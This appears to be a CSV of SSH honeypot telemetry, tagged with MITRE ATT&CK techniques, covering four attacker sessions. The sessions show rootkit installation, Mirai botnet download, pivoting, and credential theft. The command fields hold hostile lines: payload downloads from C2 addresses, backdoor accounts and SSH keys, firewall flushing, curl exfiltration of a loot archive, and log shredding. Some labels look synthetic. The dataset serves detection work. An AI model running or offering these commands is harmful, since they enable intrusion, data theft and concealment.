event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-002619,6E3F6373,2025-02-03T20:57:30Z,command_executed,hp-us-01,92.255.85.109,56309,10.0.2.10,22,ssh,chef,password,True,uname -a && uname -r,1,RU,AS8359,MTS,Rootkit/Persistence,T1082,System Information Discovery,low,,,,461,123,151,rootkit_persistence,False,,36ef4beb-859e-4ae3-9ea6-a39d35e7c4f5,
EVT-002633,6E3F6373,2025-02-03T20:57:50Z,command_executed,hp-us-01,92.255.85.109,54688,10.0.2.10,22,ssh,chef,password,True,chattr +i /etc/passwd /etc/shadow /etc/sudoers /root/.ssh/authorized_keys 2>/dev/null,15,RU,AS8359,MTS,Rootkit/Persistence,T1098.004,SSH Authorized Keys,critical,,,,461,341,341,rootkit_persistence,False,,9478a05e-6f2f-4d2d-b940-cb21a933878d,
EVT-002620,6E3F6373,2025-02-03T20:57:53Z,command_executed,hp-us-01,92.255.85.109,56533,10.0.2.10,22,ssh,chef,password,True,lsmod | head -20,2,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,276,152,rootkit_persistence,False,,c139871c-adaa-4846-a96e-34e794b4c29d,
EVT-002624,6E3F6373,2025-02-03T20:58:11Z,command_executed,hp-us-01,92.255.85.109,36458,10.0.2.10,22,ssh,chef,password,True,cd /tmp && curl -O http://91.92.251.103/rootkit/reptile.tar.gz,6,RU,AS8359,MTS,Rootkit/Persistence,T1105,Ingress Tool Transfer,medium,yes,91.92.251.103,981679d0c95d4b20aec3b0edec015435,461,315,291,rootkit_persistence,False,,6b40a7ae-f6a6-4835-a6f0-5405676545b7,
EVT-002621,6E3F6373,2025-02-03T20:58:59Z,command_executed,hp-us-01,92.255.85.109,40084,10.0.2.10,22,ssh,chef,password,True,dmesg | tail -10,3,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,531,77,rootkit_persistence,False,,76351e2b-088c-4012-a166-4eeee16ea61c,
EVT-002635,6E3F6373,2025-02-03T20:59:21Z,command_executed,hp-us-01,92.255.85.109,43008,10.0.2.10,22,ssh,chef,password,True,rm -rf /tmp/reptile* && history -c,17,RU,AS8359,MTS,Rootkit/Persistence,T1070.003,Clear Command History,low,,,,461,430,215,rootkit_persistence,False,,cc0eb4eb-7300-4857-863f-367e0ec56409,
EVT-002627,6E3F6373,2025-02-03T20:59:38Z,command_executed,hp-us-01,92.255.85.109,55107,10.0.2.10,22,ssh,chef,password,True,echo '/lib/modules/$(uname -r)/extra/reptile.ko' >> /etc/modules,9,RU,AS8359,MTS,Rootkit/Persistence,T1082,System Information Discovery,low,,,,461,163,63,rootkit_persistence,False,,26fcf68f-941f-4bc2-8362-d63d9a9d3977,
EVT-002622,6E3F6373,2025-02-03T20:59:45Z,command_executed,hp-us-01,92.255.85.109,37945,10.0.2.10,22,ssh,chef,password,True,setenforce 0 2>/dev/null; systemctl stop apparmor 2>/dev/null,4,RU,AS8359,MTS,Rootkit/Persistence,T1562.001,Disable Security Tools,low,,,,461,472,328,rootkit_persistence,False,,02f441ec-c565-45b1-992b-9062900646f6,
EVT-002629,6E3F6373,2025-02-03T20:59:50Z,command_executed,hp-us-01,92.255.85.109,48847,10.0.2.10,22,ssh,chef,password,True,echo 'svc_monitor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,11,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,262,428,rootkit_persistence,False,,b5d6429d-5552-4993-b6c5-ed8b9fd064ab,
EVT-002632,6E3F6373,2025-02-03T20:59:53Z,command_executed,hp-us-01,92.255.85.109,42220,10.0.2.10,22,ssh,chef,password,True,mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... backdoor@ops' >> /root/.ssh/authorized_keys,14,RU,AS8359,MTS,Rootkit/Persistence,T1098.004,SSH Authorized Keys,high,,,,461,559,109,rootkit_persistence,False,,48333d66-0bf7-465e-bff5-874a6f9c8464,
EVT-002623,6E3F6373,2025-02-03T21:00:15Z,command_executed,hp-us-01,92.255.85.109,41066,10.0.2.10,22,ssh,chef,password,True,apt-get update -qq && apt-get install -y -qq gcc make libssl-dev 2>/dev/null,5,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,415,90,rootkit_persistence,True,,4ec0ea51-666b-4cf3-a43e-84e3257c3971,
EVT-002626,6E3F6373,2025-02-03T21:00:17Z,command_executed,hp-us-01,92.255.85.109,54879,10.0.2.10,22,ssh,chef,password,True,insmod /lib/modules/$(uname -r)/extra/reptile.ko 2>/dev/null,8,RU,AS8359,MTS,Rootkit/Persistence,T1082,System Information Discovery,low,,,,461,446,129,rootkit_persistence,False,,bfacc7a3-ea13-4787-8747-0994b64a0fb6,
EVT-002625,6E3F6373,2025-02-03T21:01:31Z,command_executed,hp-us-01,92.255.85.109,52676,10.0.2.10,22,ssh,chef,password,True,tar xzf reptile.tar.gz && cd reptile && make install 2>/dev/null,7,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,517,307,rootkit_persistence,False,,0e228708-b0eb-44d9-9863-48039aff5074,
EVT-002628,6E3F6373,2025-02-03T21:03:15Z,command_executed,hp-us-01,92.255.85.109,46499,10.0.2.10,22,ssh,chef,password,True,sed -i '/reptile/d' /var/log/syslog /var/log/kern.log 2>/dev/null,10,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,202,167,rootkit_persistence,False,,a25c6898-45eb-4633-bcf9-c2bf5aae81dd,
EVT-002634,6E3F6373,2025-02-03T21:05:21Z,command_executed,hp-us-01,92.255.85.109,46759,10.0.2.10,22,ssh,chef,password,True,systemctl enable sshd 2>/dev/null && systemctl start sshd 2>/dev/null,16,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,169,249,rootkit_persistence,False,,b47fef4f-25b0-4962-8cc2-678e74371ff9,
EVT-002630,6E3F6373,2025-02-03T21:06:05Z,command_executed,hp-us-01,92.255.85.109,59113,10.0.2.10,22,ssh,chef,password,True,"useradd -m -s /bin/bash -G sudo,root svc_monitor 2>/dev/null",12,RU,AS8359,MTS,Rootkit/Persistence,T1059.004,Unix Shell,low,,,,461,359,73,rootkit_persistence,False,,7395d256-65d4-4217-9cda-ea189ff61ac6,
EVT-002631,6E3F6373,2025-02-03T21:06:37Z,command_executed,hp-us-01,92.255.85.109,36923,10.0.2.10,22,ssh,chef,password,True,echo 'svc_monitor:Tr0ub4dor&3' | chpasswd,13,RU,AS8359,MTS,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,461,237,419,rootkit_persistence,False,,8e971bcd-3cb1-46a8-a508-238f2ba49bab,
EVT-000633,E77958FB,2025-02-04T05:00:03Z,login_attempt,hp-ap-01,185.220.101.47,36918,10.0.3.10,2222,ssh,support,welcome1,True,,0,DE,AS204837,HostSlick,Pivoting/Tunneling,T1110,Brute Force,high,,,,287,352,2270,compromised_login,False,,6a92cdaa-f817-4c04-a750-d1746f305fb1,
EVT-000635,E77958FB,2025-02-04T05:00:09Z,command_executed,hp-ap-01,185.220.101.47,38055,10.0.3.10,2222,ssh,support,welcome1,True,ss -tlnp,2,DE,AS204837,HostSlick,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,287,223,388,pivoting_tunneling,False,,61f5455f-e4f9-40b6-8296-7f83369aefe0,
EVT-000634,E77958FB,2025-02-04T05:00:44Z,command_executed,hp-ap-01,185.220.101.47,40137,10.0.3.10,2222,ssh,support,welcome1,True,uname -a && id,1,DE,AS204837,HostSlick,Pivoting/Tunneling,T1082,System Information Discovery,low,,,,287,466,82,pivoting_tunneling,False,,0fded831-2c6a-47fa-9859-5a3213cb147a,
EVT-000638,E77958FB,2025-02-04T05:00:48Z,command_executed,hp-ap-01,185.220.101.47,52142,10.0.3.10,2222,ssh,support,welcome1,True,"socat TCP-LISTEN:8080,fork TCP:10.0.0.5:3389 &",5,DE,AS204837,HostSlick,Pivoting/Tunneling,T1572,Protocol Tunneling,high,,,,287,593,306,pivoting_tunneling,False,,a3c132e2-142a-45f4-a8f3-22e3123341ee,
EVT-000636,E77958FB,2025-02-04T05:00:51Z,command_executed,hp-ap-01,185.220.101.47,49225,10.0.3.10,2222,ssh,support,welcome1,True,cat /etc/ssh/sshd_config | grep -E 'Port|AllowTcp|GatewayPort',3,DE,AS204837,HostSlick,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,287,557,110,pivoting_tunneling,False,,5df51d0a-e0a1-4bdd-9b83-596282763e26,
EVT-000640,E77958FB,2025-02-04T05:02:09Z,command_executed,hp-ap-01,185.220.101.47,42071,10.0.3.10,2222,ssh,support,welcome1,True,ssh -o StrictHostKeyChecking=no -fNR 2222:localhost:22 pivot@185.220.101.47,7,DE,AS204837,HostSlick,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,287,434,130,pivoting_tunneling,False,,0e032449-3e7b-4324-a28f-ce2a95ce1438,
EVT-000645,E77958FB,2025-02-04T05:02:15Z,command_executed,hp-ap-01,185.220.101.47,39430,10.0.3.10,2222,ssh,support,welcome1,True,history -c,12,DE,AS204837,HostSlick,Pivoting/Tunneling,T1070.003,Clear Command History,low,,,,287,366,484,pivoting_tunneling,False,,281a5acf-ea5a-47de-b858-ca521ac3f290,
EVT-000637,E77958FB,2025-02-04T05:02:27Z,command_executed,hp-ap-01,185.220.101.47,55448,10.0.3.10,2222,ssh,support,welcome1,True,which socat ncat nc netcat 2>/dev/null,4,DE,AS204837,HostSlick,Pivoting/Tunneling,T1572,Protocol Tunneling,high,,,,287,322,480,pivoting_tunneling,False,,1d443797-6b3a-4640-b717-f894b146df7a,
EVT-000641,E77958FB,2025-02-04T05:02:27Z,command_executed,hp-ap-01,185.220.101.47,50820,10.0.3.10,2222,ssh,support,welcome1,True,ssh -o StrictHostKeyChecking=no -fND 1080 jump@185.220.101.47,8,DE,AS204837,HostSlick,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,287,384,168,pivoting_tunneling,False,,8740a9ce-c239-4ba8-b4c1-f6b46d0b88a6,
EVT-000642,E77958FB,2025-02-04T05:03:21Z,command_executed,hp-ap-01,185.220.101.47,45556,10.0.3.10,2222,ssh,support,welcome1,True,curl --socks5 127.0.0.1:1080 http://10.0.0.20:8500/v1/kv 2>/dev/null,9,DE,AS204837,HostSlick,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,medium,,,,287,589,121,pivoting_tunneling,False,,edc9f224-e51f-453e-89a5-a0037febb865,
EVT-000639,E77958FB,2025-02-04T05:04:33Z,command_executed,hp-ap-01,185.220.101.47,58560,10.0.3.10,2222,ssh,support,welcome1,True,ncat -lvp 1080 --sh-exec 'ncat 10.0.0.10 22' &,6,DE,AS204837,HostSlick,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,,,287,449,319,pivoting_tunneling,False,,026939c8-e9b6-40bd-9b74-47e09d318cc4,
EVT-000643,E77958FB,2025-02-04T05:04:43Z,command_executed,hp-ap-01,185.220.101.47,53839,10.0.3.10,2222,ssh,support,welcome1,True,"proxychains nmap -sT -p 22,80,443,3389 10.0.0.0/24 2>/dev/null",10,DE,AS204837,HostSlick,Pivoting/Tunneling,T1046,Network Service Discovery,medium,,,,287,559,133,pivoting_tunneling,False,,d4f5834e-8df2-4282-817a-4a14a29c4982,
EVT-000644,E77958FB,2025-02-04T05:06:06Z,command_executed,hp-ap-01,185.220.101.47,56071,10.0.3.10,2222,ssh,support,welcome1,True,echo 'ProxyJump 185.220.101.47' >> ~/.ssh/config,11,DE,AS204837,HostSlick,Pivoting/Tunneling,T1059,Command and Scripting Interpreter,low,,185.220.101.47,,287,316,398,pivoting_tunneling,True,,708b479a-9781-49a5-9190-f75859bbe77b,
EVT-001698,C49DC7EB,2025-02-04T10:56:21Z,login_attempt,hp-us-01,198.199.119.50,59447,10.0.2.10,22,ssh,puppet,Admin@2023,False,,0,US,AS14061,DigitalOcean,Supply Chain Abuse,T1110,Brute Force,medium,,,,318,890,2615,brute_force,False,,,
EVT-000576,A6CB9281,2025-02-06T04:43:30Z,login_attempt,hp-ap-01,43.242.116.211,38269,10.0.3.10,2222,ssh,ec2-user,root123,True,,0,HK,AS45102,Alibaba HK,Botnet/DDoS,T1110,Brute Force,high,,,,273,220,2546,compromised_login,False,,91e4e942-1b50-4711-98cf-9058cd52cbda,
EVT-000577,A6CB9281,2025-02-06T04:43:33Z,command_executed,hp-ap-01,43.242.116.211,48502,10.0.3.10,2222,ssh,ec2-user,root123,True,uname -a,1,HK,AS45102,Alibaba HK,Botnet/DDoS,T1082,System Information Discovery,low,,,,273,196,97,botnet_ddos,False,,0f6965ec-bee0-4811-9b66-120ede13496c,
EVT-000583,A6CB9281,2025-02-06T04:43:51Z,command_executed,hp-ap-01,43.242.116.211,41071,10.0.3.10,2222,ssh,ec2-user,root123,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,HK,AS45102,Alibaba HK,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,4afee9e05d8a4e15874d52804854737a,273,453,159,botnet_ddos,False,,ce5b2ab6-8199-4dfc-9763-174d94acc571,
EVT-000579,A6CB9281,2025-02-06T04:44:18Z,command_executed,hp-ap-01,43.242.116.211,53519,10.0.3.10,2222,ssh,ec2-user,root123,True,cat /proc/version,3,HK,AS45102,Alibaba HK,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,273,532,352,botnet_ddos,False,,c0673db1-8b1c-4e4b-be64-ecedfb94462a,
EVT-000578,A6CB9281,2025-02-06T04:44:20Z,command_executed,hp-ap-01,43.242.116.211,47537,10.0.3.10,2222,ssh,ec2-user,root123,True,arch,2,HK,AS45102,Alibaba HK,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,273,537,249,botnet_ddos,False,,4bcf62b0-caee-40c1-80df-399888ae2743,
EVT-000592,A6CB9281,2025-02-06T04:45:22Z,command_executed,hp-ap-01,43.242.116.211,51939,10.0.3.10,2222,ssh,ec2-user,root123,True,history -c,16,HK,AS45102,Alibaba HK,Botnet/DDoS,T1070.003,Clear Command History,low,,,,273,239,240,botnet_ddos,False,,b4e6bd3c-598c-49ba-815d-3eb02e53bcf0,
EVT-000580,A6CB9281,2025-02-06T04:45:26Z,command_executed,hp-ap-01,43.242.116.211,55718,10.0.3.10,2222,ssh,ec2-user,root123,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,HK,AS45102,Alibaba HK,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,273,93,392,botnet_ddos,False,,71c53cd2-7de8-48c5-a512-dca4694b1340,
EVT-000586,A6CB9281,2025-02-06T04:46:00Z,command_executed,hp-ap-01,43.242.116.211,39947,10.0.3.10,2222,ssh,ec2-user,root123,True,iptables -A INPUT -j ACCEPT,10,HK,AS45102,Alibaba HK,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,273,597,367,botnet_ddos,False,,e885e1f3-be42-475d-a2d4-9c566e533351,
EVT-000582,A6CB9281,2025-02-06T04:46:42Z,command_executed,hp-ap-01,43.242.116.211,33226,10.0.3.10,2222,ssh,ec2-user,root123,True,wget -q http://194.165.16.11/bins/mirai.arm -O /tmp/mirai && chmod 777 /tmp/mirai,6,HK,AS45102,Alibaba HK,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,9f24a6b46150443a9a5b8937695cbc36,273,468,174,botnet_ddos,True,,984288b1-6ebe-4ad7-b265-45139ef1b9e5,
EVT-000581,A6CB9281,2025-02-06T04:47:15Z,command_executed,hp-ap-01,43.242.116.211,41322,10.0.3.10,2222,ssh,ec2-user,root123,True,df -h / | tail -1 | awk '{print $4}',5,HK,AS45102,Alibaba HK,Botnet/DDoS,T1082,System Information Discovery,low,,,,273,530,356,botnet_ddos,False,,55dccc5e-b53a-4d9e-ab40-7123fd51178e,
EVT-000584,A6CB9281,2025-02-06T04:47:30Z,command_executed,hp-ap-01,43.242.116.211,40245,10.0.3.10,2222,ssh,ec2-user,root123,True,wget -q http://194.165.16.11/bins/mirai.mips -O /tmp/mirai && chmod 777 /tmp/mirai,8,HK,AS45102,Alibaba HK,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,5716fea931cb4f8abbf6abcd5b615dae,273,83,285,botnet_ddos,False,,a8fa0c5d-57df-4f79-8948-0d87c1ca6f62,
EVT-000588,A6CB9281,2025-02-06T04:47:30Z,command_executed,hp-ap-01,43.242.116.211,38612,10.0.3.10,2222,ssh,ec2-user,root123,True,iptables -F,12,HK,AS45102,Alibaba HK,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,273,431,461,botnet_ddos,False,,340b5017-d57c-48fa-881b-47b283b0dd1b,
EVT-000591,A6CB9281,2025-02-06T04:49:00Z,command_executed,hp-ap-01,43.242.116.211,59287,10.0.3.10,2222,ssh,ec2-user,root123,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,HK,AS45102,Alibaba HK,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,273,353,66,botnet_ddos,False,,37849c6a-4b03-49f1-bbd4-067ecd7e743d,
EVT-000585,A6CB9281,2025-02-06T04:50:06Z,command_executed,hp-ap-01,43.242.116.211,59096,10.0.3.10,2222,ssh,ec2-user,root123,True,cd /tmp && /tmp/mirai &,9,HK,AS45102,Alibaba HK,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,273,202,500,botnet_ddos,False,,0075c3cd-0b50-493f-a612-3904122d285f,
EVT-000587,A6CB9281,2025-02-06T04:51:45Z,command_executed,hp-ap-01,43.242.116.211,57651,10.0.3.10,2222,ssh,ec2-user,root123,True,iptables -A OUTPUT -j ACCEPT,11,HK,AS45102,Alibaba HK,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,273,346,482,botnet_ddos,False,,160c7fb5-c5b5-4b42-af32-d0c89f534cc0,
EVT-000590,A6CB9281,2025-02-06T04:52:08Z,command_executed,hp-ap-01,43.242.116.211,43641,10.0.3.10,2222,ssh,ec2-user,root123,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,HK,AS45102,Alibaba HK,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,4a5fc248668d46b69c742d432eadc693,273,509,444,botnet_ddos,False,,6ccf1147-b7d9-48dd-b43e-cd97ea413a13,
EVT-000589,A6CB9281,2025-02-06T04:53:15Z,command_executed,hp-ap-01,43.242.116.211,54385,10.0.3.10,2222,ssh,ec2-user,root123,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,HK,AS45102,Alibaba HK,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,273,94,127,botnet_ddos,False,,0bf1d1c4-2f53-4f65-9268-7cef00a99cda,
EVT-000434,17A3FFB1,2025-02-07T02:52:23Z,login_attempt,hp-eu-01,188.166.23.127,35230,10.0.1.10,22,ssh,backup,BeagleBone,True,,0,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1110,Brute Force,high,,,,144,821,2788,compromised_login,False,,423ec5b6-5749-4d51-a7d0-dfef57bad781,
EVT-000438,17A3FFB1,2025-02-07T02:52:43Z,command_executed,hp-eu-01,188.166.23.127,45843,10.0.1.10,22,ssh,backup,BeagleBone,True,find / -name '.env' -o -name '*.env' 2>/dev/null | head -30,4,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,384,135,data_exfiltration,False,,fb081129-61ef-40f0-a5d5-a8e5cb52d753,
EVT-000435,17A3FFB1,2025-02-07T02:52:50Z,command_executed,hp-eu-01,188.166.23.127,53537,10.0.1.10,22,ssh,backup,BeagleBone,True,uname -a,1,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1082,System Information Discovery,low,,,,144,463,399,data_exfiltration,False,,6de1beb6-f5d9-4753-bcb0-c897b6f75f1a,
EVT-000441,17A3FFB1,2025-02-07T02:53:26Z,command_executed,hp-eu-01,188.166.23.127,54569,10.0.1.10,22,ssh,backup,BeagleBone,True,cat ~/.aws/credentials 2>/dev/null,7,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1552.001,Credentials in Files,low,,,,144,318,374,data_exfiltration,False,,29d07f41-6ef5-4e8e-9e2e-73403ed5e42a,
EVT-000442,17A3FFB1,2025-02-07T02:53:35Z,command_executed,hp-eu-01,188.166.23.127,55613,10.0.1.10,22,ssh,backup,BeagleBone,True,cat ~/.aws/config 2>/dev/null,8,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1552.001,Credentials in Files,low,,,,144,150,398,data_exfiltration,False,,b288326d-96a9-4c48-9b76-ec4d61a4406a,
EVT-000436,17A3FFB1,2025-02-07T02:53:37Z,command_executed,hp-eu-01,188.166.23.127,60908,10.0.1.10,22,ssh,backup,BeagleBone,True,env | grep -iE 'aws|secret|key|token|pass|db|database',2,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,373,223,data_exfiltration,False,,4ee49eb0-0634-41f5-a7b2-211eb5a53bc1,
EVT-000450,17A3FFB1,2025-02-07T02:53:59Z,command_executed,hp-eu-01,188.166.23.127,39949,10.0.1.10,22,ssh,backup,BeagleBone,True,curl -s -F 'f=@/tmp/.loot.tgz' http://185.220.101.47:8080/rx,16,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1041,Exfiltration Over C2,critical,,185.220.101.47,,144,197,374,data_exfiltration,False,,5c0c9471-5d43-499f-a7e6-3881d749e73c,
EVT-000453,17A3FFB1,2025-02-07T02:54:36Z,command_executed,hp-eu-01,188.166.23.127,34894,10.0.1.10,22,ssh,backup,BeagleBone,True,history -c && unset HISTFILE && export HISTSIZE=0,19,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1070.003,Clear Command History,low,,,,144,455,448,data_exfiltration,False,,6287dc0a-d4bc-47a5-b551-0921945cfb5d,
EVT-000437,17A3FFB1,2025-02-07T02:54:38Z,command_executed,hp-eu-01,188.166.23.127,52486,10.0.1.10,22,ssh,backup,BeagleBone,True,cat /etc/environment,3,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,286,270,data_exfiltration,False,,56ac5036-299f-4f54-b721-3897e1ede04d,
EVT-000451,17A3FFB1,2025-02-07T02:54:39Z,command_executed,hp-eu-01,188.166.23.127,47047,10.0.1.10,22,ssh,backup,BeagleBone,True,rm -rf /tmp/.loot.tgz /tmp/.all_db.sql,17,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,255,59,data_exfiltration,False,,8ac1ae56-f7ff-477c-9a5c-6f9f6b6b1fe0,
EVT-000444,17A3FFB1,2025-02-07T02:54:53Z,command_executed,hp-eu-01,188.166.23.127,36634,10.0.1.10,22,ssh,backup,BeagleBone,True,aws s3 ls 2>/dev/null,10,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1530,Data from Cloud Storage,low,,,,144,440,385,data_exfiltration,False,,399aae95-72b8-4be3-a410-409778bdfa7d,
EVT-000446,17A3FFB1,2025-02-07T02:54:59Z,command_executed,hp-eu-01,188.166.23.127,51261,10.0.1.10,22,ssh,backup,BeagleBone,True,find /var/www -name 'wp-config.php' -o -name '.htpasswd' 2>/dev/null,12,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,220,405,data_exfiltration,False,,726b35cf-c911-49f9-9032-944ef24522d2,
EVT-000440,17A3FFB1,2025-02-07T02:55:17Z,command_executed,hp-eu-01,188.166.23.127,34582,10.0.1.10,22,ssh,backup,BeagleBone,True,find / -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -20,6,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,161,189,data_exfiltration,False,,67f103e2-6cd3-4f76-9d0b-19b0532d81ab,
EVT-000439,17A3FFB1,2025-02-07T02:55:58Z,command_executed,hp-eu-01,188.166.23.127,37378,10.0.1.10,22,ssh,backup,BeagleBone,True,find / -name 'config.yml' -o -name 'database.yml' -o -name 'secrets.yml' 2>/dev/null | head -20,5,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,265,480,data_exfiltration,False,,4294be73-91eb-43cb-9797-9457e6bf9a81,
EVT-000445,17A3FFB1,2025-02-07T02:56:25Z,command_executed,hp-eu-01,188.166.23.127,56069,10.0.1.10,22,ssh,backup,BeagleBone,True,aws secretsmanager list-secrets 2>/dev/null,11,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1555,Credentials from Password Stores,high,,,,144,257,444,data_exfiltration,False,,095267cc-926d-411b-a2da-d8df5999681e,
EVT-000452,17A3FFB1,2025-02-07T02:56:35Z,command_executed,hp-eu-01,188.166.23.127,51322,10.0.1.10,22,ssh,backup,BeagleBone,True,shred -u -z -n3 /var/log/auth.log /var/log/syslog 2>/dev/null,18,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1070.004,File Deletion,low,,,,144,97,264,data_exfiltration,False,,d39cba79-d621-4ea6-9bdd-fdb4304031ab,
EVT-000449,17A3FFB1,2025-02-07T02:58:23Z,command_executed,hp-eu-01,188.166.23.127,42968,10.0.1.10,22,ssh,backup,BeagleBone,True,tar czf /tmp/.loot.tgz /tmp/.all_db.sql ~/.aws/ ~/.ssh/ 2>/dev/null,15,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,308,463,data_exfiltration,False,,de80011a-5cbb-4114-b239-e16772feebdb,
EVT-000443,17A3FFB1,2025-02-07T02:58:32Z,command_executed,hp-eu-01,188.166.23.127,59773,10.0.1.10,22,ssh,backup,BeagleBone,True,aws sts get-caller-identity 2>/dev/null,9,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1078.004,Cloud Accounts,low,,,,144,447,136,data_exfiltration,False,,466b6b8b-819e-455b-ac77-3810e0c477cc,
EVT-000447,17A3FFB1,2025-02-07T03:02:08Z,command_executed,hp-eu-01,188.166.23.127,57426,10.0.1.10,22,ssh,backup,BeagleBone,True,cat /var/www/html/wp-config.php 2>/dev/null | grep -E 'DB_|AUTH_KEY',13,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,144,131,412,data_exfiltration,False,,6c94b170-0c72-4ecf-ae77-98e6d365e6fa,
EVT-000448,17A3FFB1,2025-02-07T03:02:39Z,command_executed,hp-eu-01,188.166.23.127,39452,10.0.1.10,22,ssh,backup,BeagleBone,True,mysqldump -u root -p'root' --all-databases 2>/dev/null > /tmp/.all_db.sql,14,NL,AS14061,DigitalOcean AMS,Data Exfiltration,T1005,Data from Local System,high,,,,144,505,451,data_exfiltration,False,,4ced6e8e-6e6b-4a53-a853-1b466a33b8b2,
EVT-002413,9E354396,2025-02-07T12:33:04Z,login_attempt,hp-eu-01,77.247.181.165,44616,10.0.1.10,22,ssh,ubuntu,qwerty,False,,0,NL,AS43350,NForce,Redis Exploitation,T1110,Brute Force,medium,,,,215,414,1246,brute_force,False,,,
